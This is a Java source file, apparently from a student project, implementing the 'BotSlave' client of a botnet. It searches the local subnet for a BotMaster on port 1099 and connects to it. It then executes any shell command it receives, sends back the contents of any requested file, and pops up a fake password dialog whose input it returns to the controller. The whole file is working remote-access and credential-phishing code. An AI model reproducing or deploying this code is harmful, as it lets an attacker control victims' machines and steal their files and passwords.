package edu.br.utfpr.projectingrid.Core;

/*
 * Classe responsavel em criar a conexao com o botMaster
 * Executa comandos enviados pelo BotMaster
 */
import edu.br.utfpr.ip.Ip;
import java.io.*;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;

/**
 *
 * @author Francisco Xavier 14/05/2018
 */
public class BotSlave {
    
    private static ObjectOutputStream out;
    private static ObjectInputStream in;
    private static Object retorno = "";
    private static String ip;
    
    BotSlave() throws InterruptedException{
        Ip verifica = new Ip();
        while(true){
            executarComando("ifconfig");
            System.out.println(retorno);
            //String ip = retorno
            String vet[] = ip.toString().split(" ");
            String ip = vet[12].substring(0, (vet[12].lastIndexOf('.')+1));
            String ipcheck = verifica.connectionsIps(ip, 1099);
            
            if(ipcheck != null){
                this.ip = ipcheck;
                break;
            }else{           
            
                Thread.currentThread().sleep(10000);
            }
            
            
        }
    }
    
    public static void main(String argv[]) throws Exception {
        new BotSlave();
        Object sentence;
        String modifiedSentence;
        try (Socket clientSocket = new Socket(ip, 1099)) {

             out = new ObjectOutputStream(clientSocket.getOutputStream());
             in = new ObjectInputStream(clientSocket.getInputStream());
           
           
            String comando = "";
            String vet[];
             while(true){
                 try{
                     comando = in.readObject().toString();
                    
                     System.out.println(comando);
                     if(comando != null || comando != ""){
                        vet = comando.split(" ");
                        if(vet[0].equals("cop")){
                            retorno = (byte[]) enviarArquivos(vet[1]);
                        }else if(vet[0].equals("senha")){
                            String mense = "";
                            for(int i = 1; i < vet.length; i++){
                                mense += vet[i]+" ";
                            }
                            retorno = senha(mense);
                        
                        }else{
                            executarComando(comando);
                        }
                     }
                     
                     
                    
                     System.out.println(retorno+"\n\nEnviando..\n");
                     out.writeObject(retorno);
                 }catch(EOFException err){
                     System.err.println("Erro ao executar o comando");
                 }
             }
 

         }catch(Exception err){
             err.printStackTrace();
         }
    }
    
    public static void executarComando(String comando){
        System.out.println("--"+comando);
        try{  
            Runtime r = Runtime.getRuntime();

            //executa comando. A janela do cmd não é visivel pelo usuário
            //String comando e os comando executavel
            System.out.println("Ola mundo");
            Process process = r.exec(comando);
            //retorno do comando
            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String saida = null;
	    String comandos = "";
            retorno = "";
            boolean cond = true;
            while((saida = br.readLine()) != null){
                    System.out.println(saida); //saida do comando
            	    retorno += saida+"\n";
                    if(saida.contains("inet end") && cond == true){
                        ip = saida;
                        cond = false;
                        
                    }
            }            
            br.close();
        }catch(IOException iOException){
                 iOException.printStackTrace();  
        }
        
    }

    public static byte[] enviarArquivos(String arquivo){

        File f = new File(arquivo);

        if(f.exists()){
           try{
                FileInputStream fs = new FileInputStream(f);
                byte[] byt = new byte[(int)f.length()];
                for(int i = 0; i < f.length(); i++){
                    byt[i] = (byte) fs.read();
                }
                return byt;
            }catch(Exception ex){
                System.err.println("Erro ao gravar byte "+ex);
            }
        }

        return null;
    }
    
     public static String senha(String menssagem){   
        // Cria campo onde o usuario entra com a senha   
        JPasswordField password = new JPasswordField(10);   
        password.setEchoChar('*');   
        // Cria um rótulo para o campo   
        JLabel rotulo = new JLabel("Entre com a senha:");   
        // Coloca o rótulo e a caixa de entrada numa JPanel:   
        JPanel entUsuario = new JPanel();   
        entUsuario.add(rotulo);   
        entUsuario.add(password);   
        // Mostra o rótulo e a caixa de entrada de password para o usuario fornecer a senha:   
        JOptionPane.showMessageDialog(null, entUsuario, menssagem, JOptionPane.PLAIN_MESSAGE);   
        // O programa só prossegue quando o usuário clicar o botao de OK do showMessageDialog.   
        // Aí, é só pegar a senha:   
        // Captura a senha:   
        return password.getText();   
        // mostra a senha no terminal:   
       // System.out.println("Você digitou: "+senha+"\nFim de execucao.");   
    }
      
}
